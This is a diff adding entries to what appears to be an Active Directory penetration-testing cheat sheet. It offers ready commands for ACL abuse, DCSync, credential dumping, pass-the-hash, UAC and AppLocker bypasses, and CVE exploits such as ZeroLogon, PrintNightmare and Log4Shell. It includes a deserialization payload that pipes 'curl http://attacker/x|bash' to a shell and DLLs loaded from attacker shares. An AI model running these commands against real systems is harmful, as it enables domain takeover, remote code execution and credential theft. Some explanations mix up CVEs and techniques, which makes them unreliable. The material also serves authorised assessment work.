+          {label: 'Link a malicious GPO to an OU', code: `<span class="cmd-str">Set-DomainObject</span> -Identity <span class="str">"OU=Servers,DC=corp,DC=local"</span> -Set @{'gPLink'='[LDAP://CN=MyGPO,...]'}`, explain: `\`-Identity\` = the target OU's distinguished name; \`-Set @{'gPLink'=...}\` = overwrites the OU's GPO-link attribute to point at an attacker-controlled GPO, which then applies to every computer/user under that OU.`},
+          {label: 'Automated OU/GPO takeover', code: `<span class="cmd-str">OUned.py</span> --config config.ini`, explain: `\`--config config.ini\` = automates the entire GPO-abuse chain (find writable OU/GPO → link or edit → push a malicious scheduled task/script) driven by a single config file instead of manual PowerView commands.`}
+        ]
+      },
+      {
+        name: 'On User — Password & Kerberos Abuse',
+        badges: [{type:'cross', label:'ACL'}, {type:'creds', label:'User'}],
+        desc: '<code>ForceChangePassword</code> resets the password outright, no old password needed. <code>GenericAll</code>/<code>GenericWrite</code> additionally lets you add a Shadow Credential, set an SPN to force a Kerberoastable ticket, or read login-script paths that sometimes contain embedded creds.',
+        examples: [
+          {label: 'Force-reset a password', code: `<span class="cmd-str">net</span> user victim NewP@ssword123 /domain`, explain: `\`net user victim NewP@ssword123 /domain\` = if you hold \`ForceChangePassword\`/\`GenericAll\` on a user object, this resets their password outright — no need to know the old one.`},
+          {label: 'Add an SPN to make the user Kerberoastable', code: `<span class="cmd-str">targetedKerberoast.py</span> -d corp.local -u jsmith -p P@ss`, explain: `\`-d/-u/-p\` = your credentials; abuses \`GenericWrite\`/\`validated-SPN\` rights over a target account to add a fake SPN to it, which makes an otherwise non-roastable account suddenly Kerberoastable.`},
+          {label: 'GenericWrite -> Shadow Credentials', code: `<span class="cmd-str">certipy</span> shadow auto -u jsmith@corp.local -p P@ss -account victim`, explain: `\`shadow auto\` = abuses \`GenericWrite\`/\`WriteProperty\` over a target account (\`-account\`) to add an attacker-controlled 'Shadow Credential' (msDS-KeyCredentialLink), then immediately uses it to request a TGT/NT hash for that account — no password reset needed.`}
+        ]
+      },
+      {
+        name: 'On Computer — Shadow Creds & RBCD',
+        badges: [{type:'cross', label:'ACL'}, {type:'windows', label:'Computer'}],
+        desc: '<code>GenericWrite</code>/<code>WriteProperty</code> on a computer object lets you add a Key Credential (Shadow Credentials, for a cert-based logon) or write <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> to configure Resource-Based Constrained Delegation onto it.',
+        examples: [
+          {label: 'Add Shadow Credentials to a computer', code: `<span class="cmd-str">pywhisker.py</span> -d corp.local -u jsmith -p P@ss --target <span class="var">WORKSTATION01$</span> --action add`, explain: `\`--target\` = the computer account you have \`GenericWrite\` over; \`--action add\` = same Shadow Credentials attack as above but against a machine account, letting you authenticate as that computer.`},
+          {label: 'Configure RBCD onto the computer', code: `<span class="cmd-str">rbcd.py</span> -delegate-from <span class="str">'attackercomputer$'</span> -delegate-to <span class="str">'WORKSTATION01$'</span> -dc-ip <span class="var">10.10.10.10</span> -action write corp.local/jsmith:P@ss`, explain: `\`-delegate-from\` = the (often attacker-controlled) computer account that will be allowed to impersonate users; \`-delegate-to\` = the victim computer; \`-action write\` = sets the \`msDS-AllowedToActOnBehalfOfOtherIdentity\` attribute, configuring Resource-Based Constrained Delegation.`}
+        ]
+      },
+      {
+        name: 'On Group — Membership & Ownership',
+        badges: [{type:'cross', label:'ACL'}, {type:'creds', label:'Group'}],
+        desc: '<code>WriteDacl</code>+<code>WriteOwner</code> lets you grant yourself full control of the group. <code>GenericAll</code>/<code>GenericWrite</code>/<code>Self</code> (Add/Remove Self as Member — an Extended Right) lets you add yourself directly, no ownership change required. Chaining onto a privileged group (Domain Admins, Account Operators) is the whole point.',
+        examples: [
+          {label: 'Grant yourself ownership, then full control', code: `<span class="cmd-str">Set-DomainObjectOwner</span> -Identity <span class="var">'IT-Admins'</span> -OwnerIdentity jsmith\n<span class="cmd-str">Add-DomainObjectAcl</span> -TargetIdentity <span class="var">'IT-Admins'</span> -PrincipalIdentity jsmith -Rights All`, explain: `\`Set-DomainObjectOwner\` = abuses \`WriteOwner\` rights to make yourself the owner of the target group object; \`Add-DomainObjectAcl -Rights All\` = as the new owner, grant yourself full control over it, then you can add members freely.`},
+          {label: 'Add yourself directly (Self / Add Member right)', code: `<span class="cmd-str">Add-DomainGroupMember</span> -Identity <span class="var">'IT-Admins'</span> -Members jsmith`, explain: `If you already have \`Self\`/\`WriteProperty\` on the group's \`member\` attribute, this adds your own account directly into the privileged group — no ownership change needed.`}
+        ],
+        notes: {type: 'tip', text: 'BloodHound labels this edge <code>AddMember</code> or <code>AddSelf</code> depending on whether it\'s the Extended Right or a broader Generic* grant — either gets you into the group either way.'}
+      },
+      {
+        name: 'DCSync',
+        badges: [{type:'dc', label:'DC'}, {type:'creds', label:'Creds'}],
+        desc: 'Abuse of the DS-Replication-Get-Changes and DS-Replication-Get-Changes-All rights. Any user with these rights can request the DC to replicate its password database. This is a domain-level right rather than tied to one object type, which is why it\'s usually the end goal of the object-level abuses above.',
+        examples: [
+          {label: 'DCSync via Impacket', code: `<span class="cmd-str">secretsdump.py</span> -just-dc <span class="str">corp.local/jsmith:P@ss@10.10.10.10</span>`, explain: `\`-just-dc\` = performs a DCSync, replicating password data (like a real DC would) instead of a normal share/file dump; requires the account to have \`Replicating Directory Changes\` rights — pulls every domain hash in one shot.`}
+        ]
+      },
+      {
+        name: 'DNSAdmins Group Abuse',
+        badges: [{type:'dc', label:'DC'}, {type:'windows', label:'Windows'}],
+        desc: 'Members of <strong>DNSAdmins</strong> can set the <code>ServerLevelPluginDll</code> registry value on a DNS server, telling the DNS service (which runs as SYSTEM, and is usually co-located on the DC) to load an arbitrary DLL — giving code execution as SYSTEM on the DC when the service restarts.',
+        examples: [
+          {label: 'Set malicious DLL and restart the DNS service', code: `<span class="cmd-str">dnscmd</span> <span class="var">dc01</span> /config /serverlevelplugindll <span class="var">\\\\attacker\\share\\evil.dll</span>\n<span class="cmd-str">sc.exe</span> \\\\<span class="var">dc01</span> stop dns\n<span class="cmd-str">sc.exe</span> \\\\<span class="var">dc01</span> start dns`, explain: `\`dnscmd .../serverlevelplugindll\` = registers an attacker-supplied DLL as a DNS server plugin; the two \`sc.exe\` commands stop and restart the DNS service so Windows loads and executes that DLL — RCE as SYSTEM on the DC if you have DNS admin rights.`}
+        ],
+        notes: {type: 'warning', text: 'Restarting the DNS service is disruptive and loud — it will bounce name resolution for the domain briefly and is an easy Sysmon/EDR trigger (unsigned DLL loaded by <code>dns.exe</code>). Confirm you actually need SYSTEM-on-DC before using this over a quieter path.'}
+      }
+    ]
+  },
+  {
+    id: 'laps',
+    title: 'LAPS & GMSA Reading',
+    icon: 'fa-lock',
+    intro: 'Reading specialized AD credential stores.',
+    items: [
+      {
+        name: 'LAPS v1 / v2 Reading',
+        badges: [{type:'windows', label:'Windows'}, {type:'creds', label:'Creds'}],
+        desc: 'Any user with <code>Read</code> rights on <code>ms-Mcs-AdmPwd</code> (v1) or the Windows LAPS password attribute (v2) can retrieve the local admin password.',
+        examples: [
+          {label: 'Read LAPS v1 password (PowerView)', code: `<span class="cmd-str">Get-DomainObject</span> -Identity file01 -Properties <span class="flag">ms-Mcs-AdmPwd</span>`, explain: `\`Get-DomainObject -Properties ms-Mcs-AdmPwd\` = reads the legacy LAPS v1 local-admin-password attribute directly, which is stored in cleartext if your account has read rights on it.`}
+        ]
+      },
+      {
+        name: 'gMSA Password Reading',
+        badges: [{type:'linux', label:'Python'}, {type:'creds', label:'Creds'}],
+        desc: 'Group Managed Service Accounts (gMSA) store their password in <code>msDS-ManagedPassword</code>.',
+        examples: [
+          {label: 'Dump gMSA password', code: `<span class="cmd-str">gMSADumper.py</span> -u jsmith -p P@ss -d corp.local -l <span class="var">10.10.10.10</span>`, explain: `\`-d/-u/-p\` = credentials; \`-l\` = target DC IP; if you have read rights on a Group Managed Service Account's password blob, this decrypts it into a usable NTLM hash for that gMSA.`}
+        ]
+      }
+    ]
+  },
+  {
+    id: 'lateral',
+    title: 'Lateral Movement & Pivoting',
+    icon: 'fa-arrows-left-right',
+    intro: 'Moving from one system to another using credentials, hashes, tickets, remote execution, and MSSQL trust crawling.',
+    items: [
+      {
+        name: 'psexec.py / wmiexec.py / evil-winrm',
+        badges: [{type:'linux', label:'Python'}, {type:'cross', label:'Ruby'}],
+        desc: 'The standard remote execution triad. <strong>psexec</strong> drops a service binary. <strong>wmiexec</strong> uses WMI. <strong>evil-winrm</strong> provides a full WinRM shell.',
+        examples: [
+          {label: 'wmiexec with NTLM hash', code: `<span class="cmd-str">wmiexec.py</span> -hashes aad3b435:NTLMHASH corp.local/Administrator@<span class="var">10.10.10.10</span>`, explain: `\`-hashes aad3b435:<NTLMHASH>\` = pass-the-hash instead of a password (the first half is the empty LM hash placeholder); connects via WMI and gets a semi-interactive shell as the target account without ever cracking the password.`}
+        ]
+      },
+      {
+        name: 'MSSQL Trust & Link Crawling',
+        badges: [{type:'linux', label:'Python'}, {type:'creds', label:'DB'}],
+        desc: 'MSSQL databases often have linked servers. An attacker can hop between SQL servers using <code>sp_linkedservers</code> and <code>use_link</code>, executing commands via <code>xp_cmdshell</code>. <strong>xp_dirtree</strong> can also be used for SMB coercion.',
+        examples: [
+          {label: 'Connect to MSSQL', code: `<span class="cmd-str">mssqlclient.py</span> corp.local/jsmith:P@ss@<span class="var">10.10.10.10</span> -windows-auth`, explain: `\`-windows-auth\` = use Windows/NTLM authentication instead of SQL auth; opens an interactive \`mssqlclient\` session against the target instance using domain credentials.`},
+          {label: 'Crawl links and execute code', code: `<span class="cmd-str">SQL></span> enable_xp_cmdshell\n<span class="cmd-str">SQL></span> xp_cmdshell whoami\n<span class="cmd-str">SQL></span> EXEC sp_linkedservers\n<span class="cmd-str">SQL></span> use_link [link_name]`, explain: `\`enable_xp_cmdshell\` = turns on the (often disabled) stored procedure for OS command execution; \`xp_cmdshell whoami\` = runs an OS command through SQL; \`sp_linkedservers\`/\`use_link\` = pivots the query to execute on a *linked* SQL server, potentially with higher privileges.`},
+          {label: 'Automated cross-server link crawl (PowerUpSQL)', code: `<span class="cmd-str">Get-SQLServerLinkCrawl</span> -username <span class="var">jsmith</span> -password <span class="var">P@ss</span> -Verbose -Instance <span class="var">sql01.corp.local</span>`, explain: `\`-username/-password\` = credentials; \`-Instance\` = starting SQL server; automatically walks the chain of linked servers to find where you can escalate or execute commands, instead of doing it by hand.`}
+        ],
+        notes: {type: 'warning', text: 'Linked-server trust is configured independently of the AD trust relationship it happens to cross. A link between a server in DomainA and one in DomainB will work even over a one-way or SID-filtered domain trust that would otherwise block the equivalent AD-level attack — treat MSSQL links as their own trust graph, not a subset of the AD one.'}
+      },
+      {
+        name: 'Pass-the-Hash / Overpass-the-Hash',
+        badges: [{type:'cross', label:'Technique'}, {type:'creds', label:'Creds'}],
+        desc: '<strong>PtH</strong> authenticates using only the NTLM hash. <strong>Overpass-the-Hash</strong> uses an NTLM hash to obtain a full Kerberos TGT, bypassing NTLM restrictions.',
+        examples: [
+          {label: 'Overpass-the-Hash (Rubeus)', code: `<span class="cmd-str">Rubeus.exe</span> asktgt /user:jsmith /domain:corp.local /rc4:NTLMHASH /ptt`, explain: `\`asktgt\` = request a fresh TGT; \`/rc4\` = the user's NTLM hash instead of a password (pass-the-hash into Kerberos, converting an NT hash into a real ticket); \`/ptt\` = inject the resulting TGT into the current session.`}
+        ]
+      },
+      {
+        name: 'SOCKS Pivoting (proxychains + nxc)',
+        badges: [{type:'linux', label:'Linux'}, {type:'network', label:'Pivot'}],
+        desc: 'Using socks proxies (like via SSH or Chisel) to chain Impacket/NetExec tools into restricted network segments. The <code>-socks</code> flag in nxc proxies connections.',
+        examples: [
+          {label: 'Run secretsdump via SOCKS', code: `<span class="cmd-str">proxychains</span> secretsdump.py -just-dc corp.local/jsmith:P@ss@<span class="var">10.10.10.10</span>`, explain: `\`proxychains\` = route the tool's traffic through an already-established SOCKS pivot; runs a DCSync dump against an internal DC that isn't directly reachable from your attacking host.`},
+          {label: 'NetExec over proxychains with AES Key', code: `<span class="cmd-str">proxychains</span> nxc smb <span class="var">10.10.10.10</span> -u jsmith -H AES_KEY --aes`, explain: `\`-H AES_KEY --aes\` = authenticate using a Kerberos AES key instead of NTLM hash/password (needed when NTLM is disabled or you only recovered AES material), tunneled through the SOCKS proxy for a pivoted target.`}
+        ]
+      },
+      {
+        name: 'Impersonation (tscon / incognito / masky)',
+        badges: [{type:'windows', label:'Windows'}, {type:'creds', label:'Impersonation'}],
+        desc: 'Hijacking active sessions. <strong>tscon</strong> hijacks RDP sessions as SYSTEM. <strong>incognito</strong> steals process tokens. <strong>masky</strong> abuses ADCS to request certs for logged-in users.',
+        examples: [
+          {label: 'Hijack RDP session', code: `<span class="cmd-str">tscon</span> <span class="flag">2</span> /dest:console`, explain: `\`tscon 2 /dest:console\` = as SYSTEM, reconnects/hijacks RDP session ID 2 onto the local console session **without a password prompt**, taking over another logged-in user's desktop.`}
+        ]
+      }
+    ]
+  },
+  {
+    id: 'cves',
+    title: 'Named CVEs & Vulnerabilities',
+    icon: 'fa-bug',
+    intro: 'A reference of critical, widely-exploited AD vulnerabilities. Many of these provide instant Domain Admin privileges against unpatched environments.',
+    items: [
+      {
+        name: 'ZeroLogon (CVE-2020-1472)',
+        badges: [{type:'dc', label:'DC'}, {type:'windows', label:'CVE'}],
+        desc: 'A flaw in the Netlogon cryptography that allows an attacker to spoof the Domain Controller computer account and reset its password, leading to instant DCSync.',
+        examples: [
+          {label: 'Exploit and null the DC password', code: `<span class="cmd-str">python3</span> zerologon_tester.py <span class="var">DC01</span> <span class="var">10.10.10.10</span>`, explain: `Exploits CVE-2020-1472 (Zerologon) against a named DC by resetting its machine account password to an empty value via a flawed Netlogon crypto implementation — instant DC-level compromise if unpatched.`}
+        ]
+      },
+      {
+        name: 'noPac (CVE-2021-42278 / CVE-2021-42287)',
+        badges: [{type:'dc', label:'DC'}, {type:'windows', label:'CVE'}],
+        desc: 'Combines a vulnerability in SAMR name impersonation with a PAC validation bypass to impersonate a Domain Admin and obtain a service ticket as them.',
+        examples: [
+          {label: 'Exploit chain', code: `<span class="cmd-str">noPac.py</span> -use-ldap -dc-host <span class="var">DC01.corp.local</span> corp.local/jsmith:P@ss --impersonate Administrator -shell`, explain: `\`-use-ldap\` = use LDAP instead of SAMR for the initial steps; combines two bugs (CVE-2020-1472 style deficiencies plus the PAC 'noPac' UAC bypass, CVE-2021-42278/42287) to impersonate Administrator and drop straight into a shell.`}
+        ]
+      },
+      {
+        name: 'Certifried (CVE-2022-26923)',
+        badges: [{type:'cross', label:'ADCS'}, {type:'windows', label:'CVE'}],
+        desc: 'An ADCS vulnerability where a low-privileged user can alter the <code>dNSHostName</code> of a computer they control to match a Domain Controller, allowing them to request a DA cert.',
+        examples: [
+          {label: 'Exploit via certipy', code: `<span class="cmd-str">certipy</span> req -u jsmith@corp.local -p P@ss -ca 'CORP-CA' -template 'Machine' -dc-ip <span class="var">10.10.10.10</span>`, explain: `\`-template 'Machine'\` = requests a certificate using the default 'Machine' template, then leverages the noPac/UAC-name-confusion bug via the certificate path to authenticate as a Domain Controller.`}
+        ]
+      },
+      {
+        name: 'MS14-068 / GPP (MS14-025)',
+        badges: [{type:'windows', label:'Legacy'}],
+        desc: '<strong>MS14-068</strong> allows forging of Kerberos PACs. <strong>GPP (MS14-025)</strong> exposes passwords stored in Group Policy Preferences XML files.',
+        examples: [
+          {label: 'Exploit MS14-068', code: `<span class="cmd-str">goldenPac.py</span> corp.local/jsmith:P@ss@<span class="var">DC01.corp.local</span>`, explain: `Exploits MS14-068, a flaw in Kerberos PAC validation, to forge a ticket claiming Domain Admin group membership for a normal user, then uses it against the named DC.`}
+        ]
+      },
+      {
+        name: 'PrintNightmare (CVE-2021-1675 / CVE-2021-34527)',
+        badges: [{type:'dc', label:'DC'}, {type:'windows', label:'CVE'}],
+        desc: 'A vulnerability in the Windows Print Spooler service (<code>RpcAddPrinterDriverEx</code>) that allows a low-privileged, authenticated user to load an arbitrary driver DLL — yielding SYSTEM locally, or remote SYSTEM on a DC if the Spooler service is running there (which it often is by default).',
+        examples: [
+          {label: 'Remote exploit against a DC', code: `<span class="cmd-str">python3</span> CVE-2021-1675.py corp.local/jsmith:P@ss@<span class="var">dc01.corp.local</span> <span class="str">'\\\\attacker\\share\\evil.dll'</span>`, explain: `PrintNightmare (CVE-2021-1675): exploits the Print Spooler RPC service to make the DC load an attacker-hosted DLL (\`\\\\attacker\\share\\evil.dll\`) as SYSTEM.`}
+        ],
+        notes: {type: 'tip', text: 'Always check first whether the Spooler service is even running (<code>rpcdump.py</code> or <code>Get-Service Spooler</code>) — it\'s frequently disabled on DCs post-2021 as a direct mitigation for this CVE.'}
+      },
+      {
+        name: 'ProxyNotShell (CVE-2022-41040 / CVE-2022-41082)',
+        badges: [{type:'windows', label:'Exchange'}, {type:'windows', label:'CVE'}],
+        desc: 'A chained SSRF (CVE-2022-41040) and PowerShell remoting RCE (CVE-2022-41082) in Microsoft Exchange — the authenticated successor to ProxyShell, requiring only a valid mailbox account rather than pre-auth access.',
+        examples: [
+          {label: 'Exploit chain against an authenticated mailbox', code: `<span class="cmd-str">python3</span> proxynotshell.py -u <span class="var">jsmith@corp.local</span> -p <span class="var">P@ss</span> --exchange-url <span class="var">https://mail.corp.local</span> --cmd <span class="str">'whoami'</span>`, explain: `Chains multiple Exchange vulnerabilities (ProxyShell family: CVE-2021-34473/34523/31207) to go from an authenticated mailbox to arbitrary command execution on the Exchange server via \`--cmd\`.`}
+        ]
+      },
+      {
+        name: 'PrivExchange (CVE-2019-0724 / CVE-2019-0686)',
+        badges: [{type:'windows', label:'Exchange'}, {type:'network', label:'Relay'}],
+        desc: 'The Exchange Server <code>PushSubscription</code> feature can be coerced into authenticating to an attacker-controlled endpoint with the Exchange machine account\'s privileges. By default that account holds <code>WriteDacl</code> on the domain object, so relaying it to LDAP is enough to grant DCSync rights.',
+        examples: [
+          {label: 'Coerce Exchange + relay to LDAP for DCSync rights', code: `<span class="comment"># On the relay listener</span>\n<span class="cmd-str">ntlmrelayx.py</span> -t <span class="str">ldap://dc01.corp.local</span> --escalate-user jsmith\n<span class="comment"># Trigger the coercion</span>\n<span class="cmd-str">python3</span> privexchange.py -u jsmith -p P@ss -ah <span class="var">attacker.corp.local</span> <span class="var">mail.corp.local</span>`, explain: `Two-part attack: \`ntlmrelayx.py --escalate-user\` sits listening for a relay to LDAP that grants DCSync rights; \`privexchange.py -ah\` then forces the Exchange server to authenticate to your listener (abusing its default over-privileged AD rights) — combined, this yields full domain compromise.`}
+        ]
+      },
+      {
+        name: 'HiveNightmare / SMBGhost',
+        badges: [{type:'windows', label:'Windows'}],
+        desc: '<strong>HiveNightmare</strong> (CVE-2021–36934) allows any user to read SAM/SYSTEM hives. <strong>SMBGhost</strong> (CVE-2020-0796) is an SMBv3 RCE.',
+        examples: [
+          {label: 'Save registry hives via HiveNightmare', code: `<span class="cmd-str">python3</span> HiveNightmare.py <span class="var">10.10.10.10</span>`, explain: `Exploits an overly-permissive ACL on the Volume Shadow Copy Service (CVE-2021-36934) to read protected files like the SAM/SYSTEM hives as a normal user, without admin rights.`}
+        ]
+      },
+      {
+        name: 'Potato Family (SEImpersonate)',
+        badges: [{type:'windows', label:'Windows'}, {type:'creds', label:'SEImpersonate'}],
+        desc: 'Local privilege escalation exploits abusing SeImpersonatePrivilege to trick a privileged process into authenticating, yielding SYSTEM. <strong>PrintSpoofer</strong> and <strong>RoguePotato</strong> cover most patched Windows versions; <strong>GodPotato</strong> and <strong>RemotePotato0</strong> (which relays cross-machine to a DC instead of privesc\'ing locally) fill in the newer/edge cases.',
+        examples: [
+          {label: 'GodPotato (newer Windows)', code: `<span class="cmd-str">GodPotato.exe</span> -cmd "cmd /c whoami > C:\\\\out.txt"`, explain: `\`-cmd\` = the command to execute as SYSTEM; GodPotato abuses token impersonation privileges (like \`SeImpersonatePrivilege\`) on modern, patched Windows builds where older Potato exploits no longer work.`},
+          {label: 'PrintSpoofer (common baseline)', code: `<span class="cmd-str">PrintSpoofer.exe</span> -i -c cmd`, explain: `\`-i -c cmd\` = spawn an interactive SYSTEM \`cmd.exe\`; the classic, reliable token-impersonation privesc for any account holding \`SeImpersonatePrivilege\` (common for service accounts and IIS app pools).`},
+          {label: 'RemotePotato0 (relay to a remote DC, not local privesc)', code: `<span class="cmd-str">RemotePotato0.exe</span> -m 1 -s 445 -t <span class="var">dc01.corp.local</span>`, explain: `\`-m 1\` = attack mode; \`-s 445\` = local port to listen on; \`-t\` = a *remote* DC to relay the coerced local authentication to — unlike other Potatoes, this one escalates by relaying outward rather than staying local.`}
+        ]
+      },
+      {
+        name: 'UAC Bypass & AppLocker/WDAC Bypass',
+        badges: [{type:'windows', label:'Windows'}, {type:'creds', label:'PrivEsc'}],
+        desc: 'Once you have a foothold, <strong>UAC bypass</strong> techniques auto-elevate a medium-integrity process to high without a prompt by abusing auto-elevating binaries (<code>fodhelper.exe</code>, <code>wsreset.exe</code>, <code>msdt.exe</code>). Where AppLocker/WDAC blocks arbitrary EXEs, LOLBins that are commonly whitelisted (<code>MSBuild.exe</code>, <code>mshta.exe</code>, <code>InstallUtil.exe</code>) execute code without ever touching the disallowed binary path.',
+        examples: [
+          {label: 'Fodhelper UAC bypass (registry hijack)', code: `<span class="cmd-str">reg</span> add HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command /d "cmd.exe" /f\n<span class="cmd-str">reg</span> add HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command /v DelegateExecute /f\n<span class="cmd-str">fodhelper.exe</span>`, explain: `Writes a hijacked command handler into the registry under the trusted, auto-elevating \`ms-settings\` shell class, then launches \`fodhelper.exe\` — because fodhelper doesn't check for a UAC prompt on this path, your command runs elevated silently.`},
+          {label: 'AppLocker bypass via MSBuild', code: `<span class="cmd-str">MsBuild.exe</span> pshell.xml`, explain: `\`MsBuild.exe pshell.xml\` = MSBuild is a Microsoft-signed binary that can execute inline C#/PowerShell tasks embedded in a project file, sailing past AppLocker rules that only block obviously 'suspicious' executables.`},
+          {label: 'AppLocker bypass via mshta', code: `<span class="cmd-str">mshta.exe</span> my.hta`, explain: `\`mshta.exe my.hta\` = mshta is a signed Windows binary that executes embedded VBScript/JScript in an \`.hta\` file — another classic 'living-off-the-land' AppLocker bypass since mshta itself is usually allow-listed.`},
+          {label: 'Check current AppLocker policy', code: `<span class="cmd-str">Get-ChildItem</span> -Path "HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\SrpV2" -Recurse`, explain: `Reads the raw AppLocker policy XML straight from the registry (\`SrpV2\` key) to see exactly which rules, paths, and publishers are allowed/denied — faster than guessing which bypass will work.`}
+        ],
+        notes: {type: 'tip', text: 'Also check the obvious writable-and-executable paths first — <code>C:\\Windows\\Tasks</code> and <code>C:\\Windows\\Temp</code> are frequently missed in AppLocker rule sets that otherwise look thorough.'}
+      }
+    ]
+  },
+  {
+    id: 'quick',
+    title: 'Quick Compromise (Vulnerable Services)',
+    icon: 'fa-bolt',
+    intro: 'Commonly exposed enterprise applications with known, high-impact vulnerabilities.',
+    items: [
+      {
+        name: 'Exchange (ProxyShell / ProxyLogon)',
+        badges: [{type:'windows', label:'Exchange'}],
+        desc: 'Pre-auth SSRF and RCE vulnerabilities in Microsoft Exchange.',
+        examples: [
+          {label: 'ProxyShell exploit chain', code: `<span class="cmd-str">python3</span> proxyshell.py <span class="var">exchange.corp.local</span>`, explain: `ProxyShell exploit chain automation against the named Exchange server, chaining the SSRF, authentication bypass, and file-write bugs into a single script run.`}
+        ]
+      },
+      {
+        name: 'Veeam (CVE-2024-40711 / CVE-2023-27532)',
+        badges: [{type:'windows', label:'Veeam'}],
+        desc: 'Veeam Backup & Replication vulnerabilities often allow unauthenticated RCE (CVE-2024-40711, CVE-2024-29855) or extraction of domain credentials stored in the DB (CVE-2023-27532).',
+        examples: [
+          {label: 'Extract credentials from Veeam DB', code: `<span class="cmd-str">sqlcmd</span> -S localhost -E -Q "SELECT name, password FROM [VeeamBackup].[dbo].[Credentials]"`, explain: `\`-S localhost -E\` = connect to the local SQL instance using Windows auth; \`-Q\` = run a raw SQL query pulling the \`Credentials\` table from Veeam's backup database, which historically stored infrastructure passwords in a weakly protected form.`}
+        ]
+      },
+      {
+        name: 'GLPI (CVE-2023-41320 / CVE-2022-35914)',
+        badges: [{type:'linux', label:'Linux'}],
+        desc: 'GLPI IT asset management vulnerabilities. CVE-2023-41320 allows authentication bypass, and CVE-2022-35914 allows unauthenticated RCE via the inventory endpoint.',
+        examples: [
+          {label: 'Exploit GLPI RCE', code: `<span class="cmd-str">curl</span> --data-urlencode 'status=1' http://<span class="var">target</span>/ajax/deploy.php`, explain: `Sends a crafted request with \`status=1\` to GLPI's vulnerable \`deploy.php\` endpoint, exploiting an unauthenticated deserialization/RCE bug in the asset-management platform.`}
+        ]
+      },
+      {
+        name: 'Java RMI / Tomcat / JBoss',
+        badges: [{type:'linux', label:'Java'}],
+        desc: 'Java RMI exposes remote methods that can be brute-forced or bypassed to achieve RCE. Tomcat/JBoss manager interfaces accept weak creds or default deployments, allowing WAR file deployment.',
+        examples: [
+          {label: 'Metasploit Java RMI exploit', code: `<span class="cmd-str">use</span> exploit/multi/misc/java_rmi_server\n<span class="cmd-str">set</span> RHOSTS <span class="var">10.10.10.50</span>\n<span class="cmd-str">exploit</span>`, explain: `Classic Metasploit workflow: \`use\` selects the Java RMI exploit module; \`set RHOSTS\` = target IP; \`exploit\` = fire it — targets an insecure/exposed Java RMI registry for remote code execution.`}
+        ]
+      },
+      {
+        name: 'EternalBlue (MS17-010)',
+        badges: [{type:'windows', label:'SMB'}, {type:'dc', label:'RCE'}],
+        desc: 'SMBv1 vulnerability allowing unauthenticated remote code execution.',
+        examples: [
+          {label: 'Metasploit exploit', code: `<span class="cmd-str">use</span> exploit/windows/smb/ms17_010_eternalblue`, explain: `Selects the EternalBlue (MS17-010) module targeting the SMBv1 vulnerability used by WannaCry — check first with an SMB version scan before firing, since it can crash unpatched hosts.`}
+        ]
+      },
+      {
+        name: 'Log4Shell',
+        badges: [{type:'cross', label:'App'}],
+        desc: 'Log4Shell (CVE-2021-44228) allows unauthenticated RCE via JNDI lookup injection.',
+        examples: [
+          {label: 'Log4Shell JNDI injection', code: `<span class="comment"># Inject into a vulnerable HTTP header</span>\n<span class="cmd-str">curl</span> -H "X-Api-Version: \${jndi:ldap://<span class="var">10.10.10.5</span>/Exploit}" http://<span class="var">target</span>:8080/`, explain: `\`X-Api-Version: \${jndi:ldap://...}\` = injects a malicious JNDI lookup string into any logged HTTP header; if Log4j parses it, the vulnerable server reaches out to your LDAP server and loads/executes attacker-supplied Java code (Log4Shell, CVE-2021-44228).`}
+        ]
+      },
+      {
+        name: 'Exposed Java Deserialization Ports',
+        badges: [{type:'cross', label:'Java'}],
+        desc: 'Raw Java RMI registries, JMX, and other serialized-object endpoints exposed on the network will deserialize whatever object graph they\'re handed. A crafted gadget-chain payload (via <code>ysoserial</code>) turns that into unauthenticated RCE — distinct from the Log4Shell JNDI vector and from Tomcat/JBoss manager abuse, since no web console or login is involved at all.',
+        examples: [
+          {label: 'Generate a gadget chain and fire it at an exposed port', code: `<span class="cmd-str">ysoserial</span> CommonsCollections6 <span class="str">'curl http://attacker/x|bash'</span> > payload.ser\n<span class="cmd-str">nc</span> <span class="var">target</span> <span class="var">1099</span> < payload.ser`, explain: `\`ysoserial CommonsCollections6 '<cmd>'\` = builds a Java deserialization gadget chain that runs your shell command when deserialized; \`> payload.ser\` saves it; \`nc target 1099 < payload.ser\` fires it at an exposed RMI/serialization port.`}
+        ]
+      },
+      {
+        name: 'Weak Database Credentials (MSSQL/MySQL/PostgreSQL)',
+        badges: [{type:'network', label:'Database'}],
+        desc: 'Exposed database ports reachable with default, weak, or reused credentials are one of the most common quick wins in an internal assessment. On MSSQL, a valid login is often enough to chain straight into <code>xp_cmdshell</code> or linked-server crawling (see Lateral Movement).',
+        examples: [
+          {label: 'Spray common DB creds with NetExec', code: `<span class="cmd-str">nxc</span> mssql <span class="var">10.10.10.0/24</span> -u sa -p <span class="str">'sa','Password1','sa123'</span> --local-auth`, explain: `\`mssql\` = target protocol; \`-u sa\` = try the default sysadmin account; \`-p 'sa','Password1','sa123'\` = comma-separated list of common weak passwords to spray; \`--local-auth\` = authenticate against the SQL instance's own accounts, not domain accounts.`}
+        ]
+      }
+    ]
+  },
+  {
+    id: 'sccm',
+    title: 'SCCM / MECM Exploitation',
+    icon: 'fa-server',
+    intro: 'Microsoft Endpoint Configuration Manager (SCCM) abuse. SCCM servers typically hold high privileges and store multiple layers of extractable credentials — this section follows the escalation chain from zero access to full site takeover, in the order you\'d actually walk it.',
+    items: [
+      {
+        name: 'Recon — Find SCCM Infrastructure',
+        badges: [{type:'linux', label:'Python'}, {type:'network', label:'Recon'}],
+        desc: 'Identify Management Points (MP), Site Servers, and Distribution Points (DP) before touching anything. <strong>sccmhunter</strong> is the standard tool; LDAP/SMB enumeration works even with a low-priv account.',
+        examples: [
+          {label: 'Find SCCM infrastructure via LDAP/SMB', code: `<span class="cmd-str">sccmhunter.py</span> find -u jsmith -p P@ss -d corp.local -dc-ip <span class="var">10.10.10.10</span> -debug\n<span class="cmd-str">sccmhunter.py</span> show -all`, explain: `\`find\` = discover SCCM site servers, management points, and distribution points via LDAP/SMB service principal names and shares; \`show -all\` = display everything sccmhunter has learned about the environment so far.`},
